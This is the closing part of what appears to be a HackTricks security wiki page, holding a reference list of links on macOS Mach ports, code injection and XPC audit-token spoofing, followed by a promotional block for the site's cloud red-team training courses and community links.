* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
